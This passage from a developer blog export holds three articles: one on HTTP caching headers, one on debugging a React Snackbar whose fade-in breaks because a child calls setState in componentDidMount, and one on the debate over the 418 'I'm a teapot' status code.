passed. Do you want the data? I have it here!” So no request will be sent, and the data will be obtained directly from the browser. Then, after one year, I request this image again, and the browser will say: “Hmm, my cache has indeed expired. I will ask the server if the file has been updated since 2017-01-01 13:00:00.” It will send the following request: GET &#x2F;logo.png If-Modified-Since: 2017-01-01 13:00:00 If the file has indeed been updated, the browser will receive a new file. If the new file has the same cache headers, it will be cached in the same way as before. What if the file has not been updated? Assuming there are no updates, the server will return a Status code: 304 (Not Modified), indicating that you can continue to use the cached file. Etag and If-None-MatchAlthough the above method seems to be good enough, there is still a small problem. The above mentioned whether the file has been “edited”, but in fact, this editing time is the editing time of the file on your computer. If you open the file, do nothing, and then save it, this editing time will also be updated. However, even if the editing time is different, the content of the file is still exactly the same. Compared with the editing time, if “whether the file content has changed” can be used as the condition for updating the cache, it would be even better. And the Etag header is such a thing. You can think of Etag as the hash value of the content of this file (but it is not, but the principle is similar, in short, the same content will generate the same hash, and different content will generate different hash). In the Response, the server will bring the Etag of this file. After the cache expires, the browser can use this Etag to ask if the file has been changed. Etag and If-None-Match are also a pair used together, just like Last-Modified and If-Modified-Since. When returning the Response, the server brings the Etag to indicate the unique hash of this file. After the cache expires, the browser sends If-None-Match to ask the server if there is new data (data that does not match this Etag). If there is, it will return the new data. If not, it will only return 304. The process can refer to the following figure on the Google website: (Image source: https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/images/http-cache-control.png?hl=zh-tw) IntermissionLet’s summarize what we have learned so far: Expires and Cache-Control: max-age determine the “freshness” of this cache, that is, when it will “expire”. Before it expires, the browser “will not” send any Request. When the cache expires, If-Modified-Since or If-None-Match can be used to ask the server if there is new data. If there is, it will return the new data. If not, it will return Status code 304, indicating that the resources in the cache can still be used. With these headers, the world seems beautiful, as if all problems have been solved. Yes, I said “seems”, which means that there are still some problems. What if you don’t want to cache?Some pages may not want any caching, such as pages containing some confidential information, and do not want anything to be retained on the client side. Remember that we mentioned at the beginning that the Cache-Control header actually solves more problems? In addition to specifying max-age, you can directly use: Cache-Control: no-store, which means: “I don’t want any caching”. Therefore, every request will definitely reach the server to request new data, and no information will be cached. (Note: In HTTP 1.0, there is a Pragma header, which has only one usage, that is: Pragma: no-cache. Some information on the Internet says that it means no caching, but according to RFC7232, this usage should be the same as Cache-Control: no-cache, not Cache-Control: no-store. The difference between these two will be mentioned later.) Cache strategy for the homepageThe above mentioned are some static resources such as pictures, which will not change for a while, so you can safely use max-age. But now we are considering another situation, that is, the homepage of the website. Although the homepage of the website will not change frequently, we hope that users can see the changes immediately once they change. What should we do? Set max-age? It is also possible, for example, Cache-Control: max-age=30, which allows the cache to expire after 30 seconds and go to the server to get new data. But what if we want it to be more real-time? Once it changes, users can see the changes immediately. You may say, “Then we can just not cache it, and fetch new pages every time.” But if this homepage has not changed for a week, using caching is actually a better way to save a lot of traffic. So our goal is: “Cache the page, but as soon as the homepage changes, we can immediately see the new page.” How do we achieve this? First, you can use Cache-Control: max-age=0, which means that this response will expire after 0 seconds, meaning that as soon as the browser receives it, it will be marked as expired. This way, when the user visits the page again, it will ask the server if there is any new data, and with the use of Etag, it can ensure that only the latest response is downloaded. For example, the first response may be like this: Cache-Control: max-age&#x3D;0 Etag: 1234 When I refresh it, the browser sends this request: If-None-Match: 1234 If the file has not changed, the server will return 304 Modified, and if it has changed, it will return the new file and update the Etag. If you use this method, it is actually “sending a request to confirm whether there is a new file every time you visit the page. If there is, download the update, otherwise use the cache.” In addition to the above trick max-age=0, there is actually a standardized strategy called: Cache-Control: no-cache. no-cache does not mean “do not use the cache at all”, but is the same as the behavior described above. It will send a request every time to confirm if there is a new file. (Note: There are actually subtle differences between these two, see What’s the difference between Cache-Control: max-age&#x3D;0 and no-cache?) If you want to “not use the cache at all”, it is Cache-Control: no-store. Don’t get confused here. To avoid confusion, let me explain the difference between these two again: Assuming that website A uses Cache-Control: no-store and website B uses Cache-Control: no-cache. When you revisit the same page every time, whether A website has been updated or not, A website will always send the “entire new file”. Assuming that index.html is 100 kb, and you visit it ten times, the accumulated traffic will be 1000kb. For website B, let’s assume that the website has not been updated for the first nine visits, and it is only updated on the tenth visit. So the server will only return Status code 304 for the first nine times, and let’s assume that the size of this packet is 1kb. The tenth time, because there is a new file, it will be 100kb. The total traffic for ten times is 9 + 100 &#x3D; 109 kb. It can be seen that the effects achieved by A and B are the same, that is, “as long as the website is updated, users can immediately see the results”, but the traffic of B is much lower than that of A because it makes good use of caching strategies. You only need to confirm whether the website has been updated every time you request, and you don’t need to download the entire file every time. This is the difference between no-store and no-cache, never use the cache and always check the cache. The last questionNowadays, Web Apps are popular, and many websites use the SPA architecture with Webpack packaging. The front-end only needs to import a JavaScript file, and rendering is done by JavaScript. For this type of website, the HTML may look like this: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link rel='stylesheet' href='style.css'>&lt;/link> &lt;script src='script.js'>&lt;/script> &lt;/head> &lt;body> &lt;!-- body is empty, all content is rendered by js --> &lt;/body> &lt;/html> After the JavaScript is loaded, it uses JavaScript to render the page. In the face of this situation, we hope that this file can be like the homepage file above, “as long as the file is updated, users can immediately see the new results”, so we can use Cache-Control: no-cache to achieve this goal. But, do you remember that no-cache actually means that every time you visit the page, you will ask the server if there are any new results? This means that a request will be sent no matter what. Is it possible not to even send a request? This means: “As long as the file is not updated, the browser will not send a request and will directly use the cache. As soon as the file is updated, the browser will immediately fetch the new file.” The former is actually what max-age does, but max-age cannot judge whether the file has been updated. So actually, this goal cannot be achieved solely by relying on the browser’s caching mechanism we introduced earlier. It requires cooperation from the server side. In fact, it is to implement the Etag mechanism in the file itself. What does that mean? Let’s take a look at an example. We change index.html to this: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link rel='stylesheet' href='style.css'>&lt;/link> &lt;script src='script-qd3j2orjoa.js'>&lt;/script> &lt;/head> &lt;body> &lt;!-- body is empty, all content is rendered by js --> &lt;/body> &lt;/html> Note that the JavaScript file name has become: script-qd3j2orjoa.js, which is actually the hash value representing this file, just like Etag. Then we set the cache strategy of this file to: Cache-Control: max-age=31536000. This way, this file will be cached for one year. No new request will be sent to this URL within a year. What if we want to update it? We don’t update this file directly, but update index.html and change the JavaScript file to: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link rel='stylesheet' href='style.css'>&lt;/link> &lt;script src='script-8953jief32.js'>&lt;/script> &lt;/head> &lt;body> &lt;!-- body is empty, all content is rendered by js --> &lt;/body> &lt;/html> Because the cache strategy of index.html is no-cache, every time you visit this page, it will check whether index.html has been updated. In this example, it has indeed been updated, so the new one will be returned to the browser. The browser will download and cache the new JavaScript file. By implementing the Etag mechanism in index.html, we have achieved our goal: “As long as the file is not updated, the browser will not send a request and will directly use the cache. As long as the file is updated, the browser will immediately fetch the new file.” The principle is to adopt different caching strategies for different files and force the browser to re-download by “replacing the JavaScript file”. You can also refer to the picture provided by Google: (Source: https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-tw) ConclusionThe reason why the caching mechanism is a bit complicated is because it is divided into different parts, and each related header is actually responsible for different parts. For example, Expires and max-age are responsible for checking whether the cache is “fresh”, while Last-Modified, If-Modified-Since, Etag, and If-None-Match are responsible for asking whether the cache can “continue to be used”. no-cache and no-store represent whether to use the cache and how to use it. This article only talks about half of the caching mechanism. The parts that are not mentioned are mostly related to shared cache and proxy servers. Are there other values that determine whether the cache can be stored on the proxy server? Or should the verification of whether it can continue to be used be verified with the original server or the proxy server? Readers who are interested in knowing more can refer to the reference materials below. Finally, I hope this article can help beginners better understand the HTTP caching mechanism. Reference materials Thoroughly understand the Http caching mechanism-based on the decomposition method of the three elements of caching strategy A brief discussion on the browser’s http caching mechanism Using HTTP cache: Etag, Last-Modified and Cache-Control 【Web caching mechanism series】1-Overview of Web caching HTTP caching control summary MDN - Cache-Control rfc2616 Google Web Fundamentals HTTP 1.0 spec","link":"/2017/08/27/en/http-cache/"},{"title":"I don't know React (Part 1)","text":"Preface Note: Currently, this blog has problems supporting JSX syntax, so it may not be easy to read the code. I will fix it as soon as possible. This title pays tribute to a series of books that people who write JavaScript have heard of even if they haven’t read them: You Don’t Know JS by Kyle Simpson. It talks about many things about JS that many people don’t know. And I don’t know React is a series of records I made for myself, recording some React that I don’t know, and these articles are summarized from my experience using React. Some of the errors I have encountered may be very basic and common (just like those written in the official documents, but I didn’t read them carefully, so I don’t know), and some may be relatively rare (I may encounter them only after writing for three or four years at work). In other words, the spirit of writing this series is different from YDKJS. The former wants to tell you some things about JS that few people know, and it feels like “I will teach you how to write JS”. The reason why I wrote this series called “I don’t know” is because I want to use a series of articles to record the misunderstandings or omissions I have encountered when writing React, and what is the correct answer. I don’t know how many articles this series will have. I will post an article every time I make a mistake. There is a big difference in this series that I think is quite large. I will try to provide the scene where the mistake was made at the beginning of the article, so that everyone has the opportunity to debug before seeing the answer and see if they can find out where the error is. I think this is actually the most essential part. This is not a standardized interview question, nor is it a React quiz randomly found on the Internet, but a real situation I have encountered at work. Because I want everyone to immerse themselves in the situation as much as possible and think about the problems I have encountered, there will be a lot of space for “defining and reproducing problems”. If you are not interested in finding answers yourself, you can also skip this part and go directly to see the answer. But I personally recommend that you try to debug it yourself first, find out where the problem is, and then come to see the answer in the article, so that you can fully absorb what the article wants to express. Anyway, let’s take a look at the case we want to talk about in this article! Reproducing the actual caseThis time we want to demo the Snackbar component, which is a small and cute component that appears at the bottom of the screen to prompt the user. Our task is very simple, just write a Snackbar and let it work normally. Because the focus here is not on style, so I will write the style part casually, just for demonstration. We can first write a basic skeleton, use the open props to determine the transparency, and can accept the children passed in and render it out: function Snackbar(&#123; children, open &#125;) &#123; return ( &lt;div style=&#123;&#123; background: \"black\", color: \"white\", transition: \"all 0.3s\", opacity: open ? 1 : 0 &#125;&#125; > &#123;children&#125; &lt;/div> ); &#125; When open is true, you can see the content, like this: So why do we do this? Because based on the adjustment of this transparency, we can write another component that will automatically hide, and use transition to achieve the fade-in and fade-out effects: const duration = 1000; const transitionDuration = 300; function AutoHideSnackbar(&#123; children, onClose &#125;) &#123; const [open, setOpen] = useState(false); useEffect(() => &#123; setOpen(true); const timer = setTimeout(() => &#123; setOpen(false); &#125;, duration); const timer2 = setTimeout(() => &#123; onClose(); &#125;, duration + transitionDuration); return () => &#123; clearTimeout(timer); clearTimeout(timer2); &#125;; &#125;, [onClose]); return &lt;Snackbar open=&#123;open&#125;>&#123;children&#125;&lt;/Snackbar>; &#125; When using it, you need to use it like this: export default function App() &#123; const [open, setOpen] = useState(false); const handleClick = () => setOpen(true); const handleClose = () => setOpen(false); return ( &lt;div className=\"App\"> &lt;h1>Snackbar&lt;/h1> &lt;button onClick=&#123;handleClick&#125;>show&lt;/button> &#123;open &amp;&amp; ( &lt;AutoHideSnackbar onClose=&#123;handleClose&#125;>hello~&lt;/AutoHideSnackbar> )&#125; &lt;/div> ); &#125; When we click the button, the open of this layer will be set to true, and then render the &lt;AutoHideSnackbar&gt; component. The initial value of open in AutoHideSnackbar is false, so it will render &lt;Snackbar open=&#123;false&#125;&gt;hello&lt;/Snackbar&gt;, and then the transparency of Snackbar will be 0, in an invisible state. After rendering and mounting, execute the useEffect inside AutoHideSnackbar, set open to true, and then the transparency of Snackbar will change to 1. Because it changes from 0 to 1 and has a transition, it achieves the effect of fade in, and set two timers to handle automatic closing. After one second, the first timer is triggered, set open to false, and then trigger the transition again, achieving the effect of fade out. After the transition ends, the second timer is triggered, calling onClose, and then calling handleClose of App, setting the open of the App layer to false, so AutoHideSnackbar is unmounted and restored to its original state. To this point, an auto-hide Snackbar has been created, but there is still room for improvement. When using Ant Design, I was deeply influenced by a usage that renders components using function calls instead of using render. For example, if you want to display a message, you can do it like this: import &#123; message &#125; from 'antd' export default function App() &#123; const handleClick = () => &#123; message.info(\"hello~\") &#125; return ( &lt;div> &lt;button onClick=&#123;handleClick&#125;>顯示訊息&lt;/button> &lt;/div> ) &#125; Instead of like this (Antd doesn’t have this usage, it’s just an example): import &#123; Message &#125; from 'antd' export default function App() &#123; const [open, setOpen] = useState(false) const handleClick = () => &#123; setOpen(true) &#125; const handleClose = () => &#123; setOpen(false) &#125; return ( &lt;div> &lt;button onClick=&#123;handleClick&#125;>顯示訊息&lt;/button> &lt;Message open=&#123;open&#125; onClose=&#123;handleClose&#125;> hello~ &lt;/Message> &lt;/div> ); &#125; It can be seen that the former usage is much simpler than the latter, because the latter must manage the opening or closing state of the component itself, but the former completely ignores these. Although it is more convenient, I would say that the former is “less React” because the spirit of React is originally centered around state, and UI is only a byproduct of state, so the opening or closing state should be in the state. However, despite this, I still prefer the former usage, because when we are displaying a message, we actually don’t care whether it is open or closed. We don’t want to know this, and all we want to do is “display the message”, so if we can use a function call like alert or confirm, things will be much simpler. So next, let’s refer to the source code of Ant Design and give our Snackbar a static method to make it easier to display messages. The code will be like this: Snackbar.show = function (children) &#123; const div = document.createElement(\"div\"); document.body.appendChild(div); ReactDOM.render( &lt;AutoHideSnackbar onClose=&#123;() => &#123; const unmountResult = ReactDOM.unmountComponentAtNode(div); if (unmountResult &amp;&amp; div.parentNode) &#123; div.parentNode.removeChild(div); &#125; &#125;&#125; > &#123;children&#125; &lt;/AutoHideSnackbar>, div ); &#125;; Actually, it dynamically generates a div when calling the function, and then uses ReactDOM.render to render the AutoHideSnackbar, and removes the div when it disappears automatically. Through this way, we can create a new React App to render the Snackbar, apart from the original React App. And because the parameter children we receive is not limited, it is also possible to display images, like this: import React from \"react\"; import &#123; Snackbar &#125; from \"./Snackbar\"; import styled from \"styled-components\"; import warningSvg from \"./icon.svg\"; import SVG from \"react-inlinesvg\"; const Warning = styled(SVG).attrs(&#123; src: warningSvg &#125;)` width: 24px; height: 24px; `; export default function App() &#123; const showSnackbar = () => &#123; Snackbar.show( &lt;div> hey! &lt;Warning /> &lt;/div> ); &#125;; return ( &lt;div className=\"App\"> &lt;h1>Snackbar&lt;/h1> &lt;p>靜態方式顯示 snackbar&lt;/p> &lt;button onClick=&#123;showSnackbar&#125;>顯示&lt;/button> &lt;/div> ); &#125; The result is: Okay, everything looks perfect, and now we can finally display things with a simple function call, without having to maintain those troublesome states… Until you take a closer look and find something strange, that is, when you use the static method of the Snackbar, the fade in disappears! You can see from the gif above that there is only a fade out effect, but no fade in effect. This is a bug I encountered before, and it is the protagonist of this article. Below is the CodeSandbox that can fully reproduce this bug and the component made above. I recommend that you fork it and try to find out where the bug is and what the root cause is, and train your debugging skills. CodeSandbox: https://codesandbox.io/s/snackbar-debug-test-kw7iv?file=/src/App.js One thing to note is that the above code does have a bug, and the judgments I made about the cause may not be correct. This was my first judgment when I first encountered this bug, and it may be correct or incorrect. Now you have the code that can fully reproduce the problem, so you can find the problem yourself using various methods. Next, I will remind you that the problem is really in the static method usage, and then I will start talking about what the answer is. If you want to debug it yourself, please do not continue reading, as it may spoil the answer. Anti-spoiler line~Anti-spoiler line~Anti-spoiler line~Anti-spoiler line~Anti-spoiler line~Anti-spoiler line~Anti-spoiler line~Anti-spoiler line~Anti-spoiler line~Anti-spoiler line~ How did I debug it?Since the problem is in the static method usage, I decided to investigate in this direction. The first thing I did was to add console.log to the render and useEffect of each component, and compare what was logged with my own understanding to see if there were any differences in the execution order. After some time of trying, I found that there didn’t seem to be any difference, and no matter which method was used, the execution flow was the same as what I knew. When AutoHideSnackbar was first rendered, open was always 0, so it was not visible at first, and then after useEffect, it became 1, so the opacity became 1, resulting in a fade in effect. But in the end, when the fade-in transition disappeared, it meant that when it appeared on the screen, open should be 1, otherwise we wouldn’t see this result. After debugging for a while without any clues, I began to suspect that it might be due to some asynchronous or React rendering mechanism that caused open to be true during the first render. So I added an rAF to delay the open attribute from becoming true: export function AutoHideSnackbar(&#123; children, onClose &#125;) &#123; const [open, setOpen] = useState(false); useEffect(() => &#123; // 原本是直接 setOpen(true)，我包了 rAF 在外面 window.requestAnimationFrame(() => setOpen(true)); const timer = setTimeout(() => &#123; setOpen(false); &#125;, duration); const timer2 = setTimeout(() => &#123; onClose(); &#125;, duration + transitionDuration); return () => &#123; clearTimeout(timer); clearTimeout(timer2); &#125;; &#125;, [onClose]); return &lt;Snackbar open=&#123;open&#125;>&#123;children&#125;&lt;/Snackbar>; &#125; After adding it, I found that there was no problem and I could successfully see the fade-in effect. However, even so, I still didn’t know why it happened in the first place. Then I tested it again and found a very serious problem! I didn’t handle the experimental variables properly. I always thought that it was because of the tricky method I used that caused this problem, so I kept looking in that direction to find the answer and see what was different between the static method and the normal render. However, I ignored the fact that there was another variable in the example above, which was whether to render SVG. When I removed the SVG from the static method example, I found that there was a fade-in effect! Damn it, I spent two or three hours doing nothing but looking in the wrong direction, and it was still because I missed something and didn’t define the problem scope properly. After knowing this, the progress became much faster. First, I replaced the react-inlinesvg library with a normal img tag and found that it still worked properly, and the fade-in effect disappeared when I added the react-inlinesvg to the normal render method. Therefore, the reason was almost certain to be caused by the react-inlinesvg library. But why exactly? I looked at its source code and didn’t see anything suspicious. In the absence of other methods, I used the most violent but also the most effective method: “changing the code in node_modules”. This is actually similar to my usual debugging method. When you are helpless and have no idea where the problem is, you start deleting code. If you delete a section and the problem still exists, it means that the code is not the culprit. If the problem disappears after deleting a certain section of code, you know that it must be related to that section of code, which is a bit like binary search on the code. If you are familiar with the execution process, it is actually quite fast to do, just keep deleting code. However, the trouble with doing this to third-party libraries is that you have to directly modify the code in node_modules, and those codes are transpiled by bable, so the readability is lower, but you can still understand it. After deleting and modifying for a while, I finally found the problematic place here: https://github.com/gilbarbara/react-inlinesvg/blob/v2.1.1/src/index.tsx#L209 When the SVG component is mounted, it will call this.load() in componentDidMount, and this.load will call this.setState(). After several tests, I found that commenting out this.setState() would solve the problem, so I can infer that the problem should be here. Then I suddenly remembered that I had seen something about what would happen when setState was called in componentDidMount in the official documentation before, so I Googled “componentDidMount setState” and found many related examples. To make sure I didn’t find the wrong place, I wrote a simple component myself, added this.setState in componentDidMount, and let the Snackbar render it. I did reproduce the same problem, which was that the fade-in effect disappeared. The code would look like this: class Comp extends React.Component &#123; componentDidMount() &#123; this.setState(&#123; a: 1 &#125;); &#125; render() &#123; return &lt;div>hello&lt;/div>; &#125; &#125; // render 的時候 &lt;AutoHideSnackbar onClose=&#123;handleClose&#125;> &lt;Comp /> &lt;/AutoHideSnackbar> After going through many difficulties, the cause of the problem was finally found, which was that calling setState in componentDidMount would cause some unexpected consequences. But what exactly are these unexpected consequences? Check the official documentationJust by using the very straightforward keywords “componentdidmount setstate”, you can find a lot of information, such as what I have seen before: Some Good Habits for Writing React - Lifecycle Method and State Management, or the main topic of this article: Official Documentation. The content of the file is written as follows: You may call setState() immediately in componentDidMount(). It will trigger an extra rendering, but it will happen before the browser updates the screen. This guarantees that even though the render() will be called twice in this case, the user won’t see the intermediate state. If you call setState synchronously in componentDidMount, it will immediately trigger a second render, and it will happen before the browser updates the screen. Therefore, the user won’t see the result of the first render, only the second one. This explains why our fade-in feature is broken. Assuming our code looks like this (CodeSandbox example): class Comp extends React.Component &#123; componentDidMount() &#123; console.log(\"Comp componentDidMount\"); this.setState(&#123; a: 1 &#125;); &#125; render() &#123; console.log(\"Comp render\"); return &lt;div>hello&lt;/div>; &#125; &#125; export function Snackbar(&#123; children, open &#125;) &#123; console.log(\"Snackbar render:\", &#123; open &#125;); return ( &lt;div style=&#123;&#123; background: \"black\", color: \"white\", transition: \"all 0.3s\", opacity: open ? 1 : 0 &#125;&#125; > &#123;children&#125; &lt;/div> ); &#125; export function AutoHideSnackbar(&#123; children, onClose &#125;) &#123; const [open, setOpen] = useState(false); console.log(\"AutoHideSnackbar render:\", &#123; open &#125;); useEffect(() => &#123; console.log(\"AutoHideSnackbar useEffect\"); setOpen(true); const timer = setTimeout(() => &#123; setOpen(false); &#125;, duration); const timer2 = setTimeout(() => &#123; onClose(); &#125;, duration + transitionDuration); return () => &#123; clearTimeout(timer); clearTimeout(timer2); &#125;; &#125;, [onClose]); return &lt;Snackbar open=&#123;open&#125;>&#123;children&#125;&lt;/Snackbar>; &#125; We can determine the execution order by observing the log, which looks like this: AutoHideSnackbar render: {open: false} Snackbar render: {open: false} Comp render Comp componentDidMount AutoHideSnackbar useEffect AutoHideSnackbar render: {open: true} Snackbar render: {open: true} Comp render It can be seen that there are a total of two renders. The first one is: AutoHideSnackbar render: {open: false} Snackbar render: {open: false} Comp render Comp componentDidMount AutoHideSnackbar useEffect During the first render, Snackbar’s open is false, so the opacity is 0. Then, its children, Comp, are rendered. After rendering, Comp’s componentDidMount executes setState. Because it is executed here, according to the documentation, the user won’t see the result of the first render. After Comp’s didMount, AutoHideSnackbar’s useEffect is executed, which sets open to true. One thing worth noting here is that React’s official website states: The function passed to useEffect will run after the render is committed to the screen. It seems that “after the render is committed to the screen” is correct in most cases, and useEffect will be executed after the browser updates the screen (render is committed to the screen can be understood in this way?). However, if there is a class component below and synchronous setState is performed in componentDidMount, it will not be like this. It cannot be guaranteed that the user has seen the last render when useEffect is executed. After this is executed, the second render will be executed: AutoHideSnackbar render: {open: true} Snackbar render: {open: true} Comp render In the second render, the opacity will be 1, and according to the official documentation, the user won’t see the result of the first render, so the opacity will be 1 when it first appears on the screen, and the fade-in effect will naturally disappear. PostscriptAlthough the above behavior has been explained, I still couldn’t figure out one thing at first, that is, since componentDidMount means that something has been placed on the DOM, won’t the user always see it? How can you “mount but not let the user see the result”? Later, I went to Twitter to ask, and thanks to Chen Guanlin’s answer, I directly broke through the blind spot: Updating the DOM and updating the screen are two different things. The pixel pipeline waits for all JavaScript to finish running before rendering. For example, if you use a for loop to update the DOM many times, only the final result will be displayed on the screen. After reading this, I realized that updating the DOM and updating the screen are two different things. Updating the DOM does not mean that the browser will immediately paint the changes. Therefore, it is possible to update the DOM twice in one cycle, and the first result will not be displayed on the screen, only the second one will. Before encountering these React problems, I always thought that I had a certain level of understanding of React or how the DOM works. However, I was repeatedly struck by the fact that I had overlooked many important parts. Every time I write about it, I feel like saying, “Am I really so unfamiliar with React?”. But there is no other way. Whenever I encounter something I don’t know, I learn it. After encountering more problems, I will also know more solutions, and I will gradually understand these operating mechanisms. The above is the first article of “I don’t know React”. I spent a morning on it and even went to ask my colleagues. At first, I was always entangled in the problems caused by the static method, and I went in the wrong direction until I suddenly realized that the difference was not there, but in the things rendered. Once the cause of the problem is correctly identified during debugging, finding a solution is usually not far away, and you will know how to search for keywords. Because this experience also reminded me that when debugging, remember to clean up unrelated things so that you can truly confirm the root cause of the problem.","link":"/2020/10/31/en/i-dont-know-react-1/"},{"title":"The Battle to Save the Teapot: 418 I am a teapot","text":"IntroductionThere are many HTTP Status Codes that we are all familiar with, such as 404 Not Found, 500 Internal Server Error, and 200 OK, among others. Among the many status codes, there is one that is clearly meant to be humorous: 418 I’m a teapot. But did you know that it is not part of the HTTP standard, so it is not a standard HTTP status code? You might say, “I’ve read the RFC, how can it not be?” But that RFC has nothing to do with HTTP, and many people have not noticed this. I didn’t notice this at first either, and I thought 418 was part of the HTTP standard until someone posted an issue on Node.js’s GitHub in August 2017: 418 I’m A Teapot. The issue mentioned that they wanted to remove support for 418, and when the author of the issue was told that Go was doing the same thing, they also posted an issue on Go. At the time, the request to remove the 418 status code actually caused quite a stir, and most people were actually against removing this status code. There was even a save418.com created to try to save 418. Recently, I spent some time studying the whole thing, and in the process of organizing it, I found that whether you are for or against it, the reasons behind it are worth thinking about, so I summarized it into an article to share with everyone. The Origin of 418The origin of 418 can be traced back to April Fool’s Day 1998, in this document: RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP&#x2F;1.0). HTCPCP stands for Hyper Text Coffee Pot Control Protocol, and this RFC describes a protocol called HTCPCP, which is built on top of HTTP and can be used to brew coffee using this protocol. Regarding the 418 part, it is in Section 2.3.2: 2.3.2 418 I’m a teapot Any attempt to brew coffee with a teapot should result in the error code “418 I’m a teapot”. The resulting entity body MAY be short and stout. The meaning is that if someone wants to brew coffee with a teapot, you should return a 418 status code, “I’m a teapot”, why are you using me to brew coffee? The only thing worth noting here is that 418 is in the HTCPCP protocol, not HTTP. So 418 is not a standard HTTP status code. The Storm to Remove 418On August 5, 2017, Mark Nottingham posted an Issue on Node.js’s GitHub: Node implements the 418 I’m a Teapot status code in a few places. Its source is RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP&#x2F;1.0). Note the title - HTCPCP&#x2F;1.0 is not HTTP&#x2F;1.x. HTCPCP was an April 1 joke by Larry to illustrate how people were abusing HTTP in various ways. Ironically, it’s not being used to abuse HTTP itself – people are implementing parts of HTCPCP in their HTTP stacks. In particular, Node’s support for the HTCPCP 418 I’m a Teapot status code has been used as an argument in the HTTP Working Group to preclude use of 418 in HTTP for real-world purposes. While we have a number of spare 4xx HTTP status codes that are unregistered now, the semantics of HTTP are something that (hopefully) are going to last for a long time, so one day we may need this code point. Please consider removing support for 418 from Node, since it’s not a HTTP status code (even by its own definition). I know it’s amusing, I know that a few people have knocked up implementations for fun, but it shouldn’t pollute the core protocol; folks can extend Node easily enough if they want to play with non-standard semantics. Thanks, The author requests Node to remove support for 418, as it is not an HTTP standard status code. Although there are still many 4xx status codes available, if we hope that HTTP can last for a long time, we will eventually need to use this status code. After some discussion, someone pointed out that Go also implemented 418, so Mark Nottingham went to Go’s GitHub and posted a similar issue: net&#x2F;http: remove support for status code 418 I’m a Teapot. Both of these issues are actually worth reading, as there are many constructive discussions inside. Below, I summarize several supporting and opposing arguments. Opposing removal: 418 is harmless 418 is a harmless Easter egg, and it’s fun, keep it away from my 418! I think this argument is quite weak. It is only necessary to prove that 418 is actually harmful. Supporting removal: What if someone needs to use 418 in the future? You say 418 is harmless, but if we hope that HTTP can last for a long time, then one day we will need to use 418, and it will mean something else on that day. Even if you keep 418, one less status code can be used. I find this argument quite interesting. Indeed, according to this argument, 418 occupies a position, and one less status code can be used in the future. But is this “one” important? It can be seen together with the opposing argument below. Opposing removal: 418 only occupies one space, the problem is not with 418If the day when 4xx is almost used up really comes, should we review the design of HTTP or review that there are not enough status codes? If there is really only one left that can be used, does it mean that there are bigger problems to be solved? The reason why I find this point interesting is that it is quite similar to the problems we encounter when writing programs. Sometimes you may worry that you are premature optimization or over-engineering, and you have made optimizations that are completely unnecessary. Suppose there is a program that uses the numbers 1 to 100 to represent different states. As time goes by, we will need different numbers to represent different states, so the numbers that can be used will become fewer and fewer, and we hope that this program can last for a long time. In this case, do you agree that we take one of the numbers as an Easter egg? If you object and think that every number is important and should not be taken out as an Easter egg, it means that you think 418 should be removed. But my own view of this issue is that a number is completely irrelevant. The reason is that if you really use up all 99 numbers, even if I return the number I took as an Easter egg to you, you will still use up all the numbers soon. At that time, you still need to find a new solution. So missing one number doesn’t make much difference. Supporting removal: 418 is not in the HTTP standardThis is the most powerful argument in my opinion. Everyone knows that 418 is an Easter egg and it is interesting, but it is not part of the HTTP standard. If you want to implement a program that “complies with the HTTP standard” today, you should not include 418 because it is not inside. In IANA, 418 is also an unassigned status. If you are an ordinary person and want to implement 418 in your own server or app, no one will interfere with you. But for projects like Node.js and Go, they should develop in compliance with the specifications. This point can also be extended to the problems encountered in product development. If the PM specification is not clear, the engineer will either communicate with PM or ask PM to write the ambiguous part more clearly, preferably without any personal interpretation space, the clearer the better. Is it reasonable for an engineer to secretly add an extra Easter egg to a specification that has been written super clearly by the PM? This Easter egg may be irrelevant and only the engineer knows how to open it, but it is still beyond the specification. When considering the issue of whether to keep 418 or not, you may only see 418. But I think the choice you make when encountering the 418 issue is related to the development problems you usually encounter. Interestingly, you may choose A for 418, but choose B for similar development issues, and the two are conflicting. From my personal point of view, the reason that 418 is not in the standard is very powerful. However, emotionally, I don’t want it to be removed, fortunately, there is also a powerful argument against it. Against removal: 418 has been misused for too longWhen doing version updates, an important point is to maintain backward compatibility. If it is not something important, try not to have a breaking change. And this argument is that 418 as a “status code mistakenly thought to be HTTP standard” has been more than ten years, so almost every mainstream library supports 418 (you see Node.js and Go both support it), if you remove the support of 418 today, what about the server that used 418 before? I also think this argument is quite powerful. 418 has been misused for too long, and removing it will cause more problems than maintaining the status quo. From this point of view, it should not be removed. Follow-up development and current situation of 418After Mark Nottingham proposed to remove 418, some people thought he was joking and only had the idea of touching 418 when he was too idle. But if you click into his GitHub, you can see his self-introduction: I work on HTTP specifications and implementations. He originally participated in various organizations related to HTTP standards and made many contributions in this field. After the community raised objections, he also decided to change his position from removing 418 to retaining 418: So, I poked a couple of implementations to see if they’d remove 418’s “teapot” semantics, and there was a reaction (to put it mildly). I think we need to reserve 418 to make it clear it can’t be used for the foreseeable future (Source: http-wg mailing list: Reserving 418) So he drafted a document: Reserving the 418 HTTP Status Code, which explains that the status of 418 should be set as reserved and cannot be registered by others: [RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of the application-specific 418 (I’m a Teapot) status code. In the intervening years, this status code has been widely implemented as an “easter egg”, and therefore is effectively consumed by this use. This document changes 418 to the status of “Reserved” in the IANA HTTP Status Code registry to reflect that. When I was researching this whole thing, I found that the information in this draft had expired (Expires: February 12, 2018). When I checked the IANA HTTP Status Code registry, I found that 418 was still unassigned. All the clues end here, so what happened to 418 in the end? Will it be reserved? So I wrote an email to Mark Nottingham himself, and he only gave me a link: https://github.com/httpwg/http-core/issues/43. From this issue, you can find this PR: Reserve 418 status code, which modified the file draft-ietf-httpbis-semantics-latest.xml. The latest draft can also be found on the httpwg website: https://httpwg.org/http-core/draft-ietf-httpbis-semantics-latest.html. In the latest draft, the following section has been added: 9.5.19. 418 (Unused) [RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of an application-specific 418 status code. In the intervening years, this status code has been widely implemented as an “Easter Egg”, and therefore is effectively consumed by this use. Therefore, the 418 status code is reserved in the IANA HTTP Status Code registry. This indicates that the status code cannot be assigned to other applications currently. If future 